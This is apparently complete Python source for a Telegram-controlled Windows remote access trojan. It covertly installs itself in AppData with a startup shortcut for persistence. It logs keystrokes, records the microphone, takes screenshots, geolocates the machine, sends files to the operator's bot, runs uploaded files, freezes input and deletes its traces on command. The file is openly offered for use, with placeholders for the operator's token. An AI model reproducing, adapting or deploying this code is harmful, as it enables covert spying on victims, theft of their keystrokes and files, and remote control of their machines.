from PIL import ImageGrab 							# /capture_pc
from shutil import copyfile, copyfileobj, rmtree 	# /ls, /pwd, /cd /copy
from sys import argv, path, stdout 					# console output
from json import loads 								# reading json from ipinfo.io
from winshell import startup 						# persistence
from tendo import singleton							# this makes the application exit if there's another instance already running
from win32com.client import Dispatch				# used for WScript.Shell
from time import strftime, sleep
import time
import threading 									#used for proxy
#import proxy
import pyaudio, wave 								# /hear
import telepot, requests 							# telepot => telegram, requests => file download
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import os, os.path, platform, ctypes
import pyHook, pythoncom 							# keylogger
import getpass
import socket



#global content_type, chat_type, chat_id
global content_type, chat_type, chat_id, response, command
def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids

def pressed_chars(event):
	if event and type(event.Ascii) == int:
		f = open(log_file,"a")
		if len(event.GetKey()) > 1:
			tofile = '<'+event.GetKey()+'>'
		else:
			tofile = event.GetKey()
		if tofile == '<Return>':
			print tofile
		else:
			stdout.write(tofile)
	return not keyboardFrozen

def internalIP():
	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	internal_ip.connect(('google.com', 0))
	return internal_ip.getsockname()[0]

def on_chat_message(msg):
	content_type, chat_type, chat_id = telepot.glance(msg)
	keyboard = InlineKeyboardMarkup(inline_keyboard=[
		[InlineKeyboardButton(text='Capture_PC', callback_data='capture_pc')],
		[InlineKeyboardButton(text='cd: <target_dir>', callback_data='cd')],
		[InlineKeyboardButton(text='Delete: <target_file>', callback_data='delete')],
		[InlineKeyboardButton(text='Download: <target_file>', callback_data='download')],
		[InlineKeyboardButton(text='freeze_keyboard', callback_data='freeze_keyboard')],
		[InlineKeyboardButton(text='freeze_mouse', callback_data='freeze_mouse')],
		[InlineKeyboardButton(text='hear: [time in seconds, default=5s]', callback_data='hear')],
		[InlineKeyboardButton(text='ip_info', callback_data='ip_info')],
		[InlineKeyboardButton(text='keylogs', callback_data='keylogs')],
		[InlineKeyboardButton(text='ls: [target_folder]', callback_data='ls')],
		[InlineKeyboardButton(text='msg_box: <text>', callback_data='msg_box')],
		[InlineKeyboardButton(text='PC_info', callback_data='pc_info')],
		[InlineKeyboardButton(text='Play: <youtube_videoId>', callback_data='play')],
		[InlineKeyboardButton(text='Proxy', callback_data='proxy')],
		[InlineKeyboardButton(text='PWD', callback_data='pwd')],
		[InlineKeyboardButton(text='Tasklist: Returns the tasklist', callback_data='tasklist')],
		[InlineKeyboardButton(text='run <target_file>', callback_data='run')],
		[InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
		[InlineKeyboardButton(text='arp: Returns ARP Table', callback_data='arp')],
		[InlineKeyboardButton(text='to: <target_computer>, [other_target_computer]', callback_data='to')]
	])
	bot.sendMessage(chat_id, 'Buttons only please', reply_markup=keyboard)

	if checkchat_id(chat_id):
		if 'text' in msg:
			print 'Got message from ' + str(chat_id) + ': ' + msg['text']
			command = msg['text']
			response = ''
			if command == '/capture_pc':
				capture_pc(msg)


def on_callback_query(msg):
	query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
	print('Callback Query:', query_id, from_id, query_data)
	if query_data == 'capture_pc':
		bot.sendChatAction(from_id, 'typing')
		screenshot = ImageGrab.grab()
		screenshot.save('screenshot.jpg')
		bot.sendChatAction(from_id, 'upload_photo')
		bot.sendDocument(from_id, open('screenshot.jpg', 'rb'))
		os.remove('screenshot.jpg')
	elif query_data == 'arp':
		response =''
		bot.sendChatAction(from_id, 'typing')
		lines = os.popen('arp -a -N ' + internalIP())
		for line in lines:
			line.replace('\n\n', '\n')
			response += line
		bot.sendMessage(from_id, response)
	elif query_data == 'delete':
		command = command.replace('/delete', '')
		path_file = command.strip()
		try:
			os.remove(path_file)
			response = 'Succesfully removed file'
			bot.sendMessage(from_id, response)
		except:
			try:
				os.rmdir(path_file)
				response = 'Succesfully removed folder'
				bot.sendMessage(from_id, response)
			except:
				try:
					shutil.rmtree(path_file)
					response = 'Succesfully removed folder and it\'s files'
					bot.sendMessage(from_id, response)
				except:
					response = 'File not found'
					bot.sendMessage(from_id, response)
	elif query_data == 'download':
		bot.sendChatAction(from_id, 'typing')
		path_file = command.replace('/download', '')
		path_file = path_file[1:]
		if path_file == '':
			response = '/download C:/path/to/file.name or /download file.name'
			bot.sendMessage(from_id, response)
		else:
			bot.sendChatAction(from_id, 'upload_document')
			try:
				bot.sendDocument(from_id, open(path_file, 'rb'))
			except:
				try:
					bot.sendDocument(from_id, open(hide_folder + '\\' + path_file))
					response = 'Found in hide_folder: ' + hide_folder
					bot.sendMessage(from_id, response)
				except:
					response = 'Could not find ' + path_file
					bot.sendMessage(from_id, response)
	elif query_data == 'freeze_keyboard':
		global keyboardFrozen
		keyboardFrozen = not command.startswith('/un')
		hookManager.KeyAll = lambda event: not keyboardFrozen
		response = 'Keyboard is now '
		if keyboardFrozen:
			response += 'disabled. To enable, use unfreeze_keyboard'
			bot.sendMessage(from_id, response)
		else:
			response += 'enabled'
			bot.sendMessage(from_id, response)
	elif query_data == 'freeze_mouse':
		global mouseFrozen
		mouseFrozen = not command.startswith('/un')
		hookManager.MouseAll = lambda event: not mouseFrozen
		hookManager.HookMouse()
		response = 'Mouse is now '
		if mouseFrozen:
			response += 'disabled. To enable, use /unfreeze_mouse'
			bot.sendMessage(from_id, response)
		else:
			response += 'enabled'
			bot.sendMessage(from_id, response)
	elif query_data == 'hear':
		SECONDS = -1
		try:
			SECONDS = int(command.replace('/hear', '').strip())
		except:
			SECONDS = 5

		CHANNELS = 2
		CHUNK = 1024
		FORMAT = pyaudio.paInt16
		RATE = 44100

		audio = pyaudio.PyAudio()
		bot.sendChatAction(from_id, 'typing')
		stream = audio.open(format=FORMAT, channels=CHANNELS,
							rate=RATE, input=True,
							frames_per_buffer=CHUNK)
		frames = []
		for i in range(0, int(RATE / CHUNK * SECONDS)):
			data = stream.read(CHUNK)
			frames.append(data)
		stream.stop_stream()
		stream.close()
		audio.terminate()

		wav_path = hide_folder + '\\mouthlogs.wav'
		waveFile = wave.open(wav_path, 'wb')
		waveFile.setnchannels(CHANNELS)
		waveFile.setsampwidth(audio.get_sample_size(FORMAT))
		waveFile.setframerate(RATE)
		waveFile.writeframes(b''.join(frames))
		waveFile.close()
		bot.sendChatAction(from_id, 'upload_document')
		bot.sendAudio(from_id, audio=open(wav_path, 'rb'))
	elif query_data == 'ip_info':
		bot.sendChatAction(from_id, 'find_location')
		info = requests.get('http://ipinfo.io').text  # json format
		response = 'External IP: ' + info.replace('{', '').replace('}', '').replace(' "', '').replace('"','') + '\n' + 'Internal IP: ' + '\n' + internalIP()
		bot.sendMessage(from_id, response)
		location = (loads(info)['loc']).split(',')
		bot.sendLocation(from_id, location[0], location[1])
	elif query_data == 'keylogs':
		bot.sendChatAction(from_id, 'upload_document')
		bot.sendDocument(from_id, open(log_file, "rb"))
	elif query_data == 'ls':
		bot.sendChatAction(from_id, 'typing')
		command = command.replace('/ls', '')
		command = command.strip()
		files = []
		if len(command) > 0:
			files = os.listdir(command)
		else:
			files = os.listdir(os.getcwd())
		human_readable = ''
		for file in files:
			human_readable += file + '\n'
		response = human_readable
		bot.sendMessage(from_id, response)
	elif query_data == 'msg_box':
		message = command.replace('/msg_box', '')
		if message == '':
			response = '/msg_box yourText'
			bot.sendMessage(from_id, response)
		else:
			ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
			response = 'MsgBox displayed'
			bot.sendMessage(from_id, response)
	elif query_data == 'pc_info':
		bot.sendChatAction(from_id, 'typing')
		info = ''
		for pc_info in platform.uname():
			info += '\n' + pc_info
		response = info + '\n' + 'Username: ' + getpass.getuser()
		bot.sendMessage(from_id, response)
	elif query_data == 'play':
		command = command.replace('/play ', '')
		command = command.strip()
		if len(command) > 0:
			systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
			systemCommand += command
			systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
			if os.system(systemCommand) == 0:
				response = 'YouTube video is now playing'
				bot.sendMessage(from_id, response)
			else:
				response = 'Failed playing YouTube video'
				bot.sendMessage(from_id, response)
		else:
			response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
			bot.sendMessage(from_id, response)
	elif query_data == 'proxy':
		threading.Thread(target=proxy.main).start()
		info = requests.get('http://ipinfo.io').text  # json format
		ip = (loads(info)['ip'])
		response = 'Proxy succesfully setup on ' + ip + ':8081'
		bot.sendMessage(from_id, response)
	elif query_data == 'pwd':
		response = os.getcwd()
		bot.sendMessage(from_id, response)
	elif query_data == 'tasklist':
		lines = os.popen('tasklist /FI "STATUS eq RUNNING"')
		response = ''
		for line in lines:
			line.replace('\n\n', '\n')
			response += line
		bot.sendMessage(from_id, response)
	elif query_data == 'run':
		bot.sendChatAction(from_id, 'typing')
		path_file = command.replace('/run', '')
		path_file = path_file[1:]
		if path_file == '':
			response = '/run_file C:/path/to/file'
			bot.sendMessage(from_id, response)
		else:
			try:
				os.startfile(path_file)
				response = 'File ' + path_file + ' has been run'
				bot.sendMessage(from_id, response)
			except:
				try:
					os.startfile(hide_folder + '\\' + path_file)
					response = 'File ' + path_file + ' has been run from hide_folder'
					bot.sendMessage(from_id, response)
				except:
					response = 'File not found'
					bot.sendMessage(from_id, response)
	elif query_data == 'self_destruct':
		bot.sendChatAction(from_id, 'typing')
		response = 'Destroying all traces!'
		bot.sendMessage(from_id, response)
		if os.path.exists(hide_folder):
			for file in os.listdir(hide_folder):
				try:
					os.remove(hide_folder + '\\' + file)
				except:
					pass
		if os.path.isfile(target_shortcut):
			os.remove(target_shortcut)
		while True:
			sleep(10)
	elif query_data == 'to':
		command = command.replace('/to', '')
		if command == '':
			response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
			bot.sendMessage(from_id, response)
		else:
			targets = command[:command.index('/')]
			if platform.uname()[1] in targets:
				command = command.replace(targets, '')
				msg = {'text': command, 'chat': {'id': chat_id}}
				handle(msg)
	else:  # Upload a file to target
		file_name = ''
		file_id = None
		if 'document' in msg:
			file_name = msg['document']['file_name']
			file_id = msg['document']['file_id']
		elif 'photo' in msg:
			file_time = int(time.time())
			file_id = msg['photo'][1]['file_id']
			file_name = file_id + '.jpg'
		file_path = bot.getFile(file_id=file_id)['file_path']
		link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
		file = (requests.get(link, stream=True)).raw
		with open(hide_folder + '\\' + file_name, 'wb') as out_file:
			copyfileobj(file, out_file)
		response = 'File received succesfully.'
		bot.sendMessage(from_id, response)

	bot.answerCallbackQuery(query_id, text='DONE SON!')



me = singleton.SingleInstance()

# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
known_ids = ''
#known_ids.append(os.environ['TELE# GRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
appdata_roaming_folder = 'APPDATA'	# = 'C:\Users\Username\AppData\Roaming'
# HIDING OPTIONS
# ---------------------------------------------
hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
# ---------------------------------------------
target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
if not os.path.exists(hide_folder):
	os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
initi = False
keyboardFrozen = False
mouseFrozen = False
user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
log_file = hide_folder + '\\keylogs.txt'
hookManager = pyHook.HookManager()
# functionalities dictionary: command:arguments

with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")

# REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
token = '111111111:11111111111111111111111111111111' # you can set your environment variable as well
bot = telepot.Bot(token)
#bot.message_loop(handle)
bot.message_loop({'chat': on_chat_message,
				  'callback_query': on_callback_query})
if len(known_ids) > 0:
	helloWorld = platform.uname()[1] + ": I'm up."
	print helloWorld
	for known_id in known_ids:
		bot.sendMessage(known_id, helloWorld)
print 'Listening for commands on ' + platform.uname()[1] + '...'
hookManager.KeyDown = pressed_chars
hookManager.HookKeyboard()
pythoncom.PumpMessages()
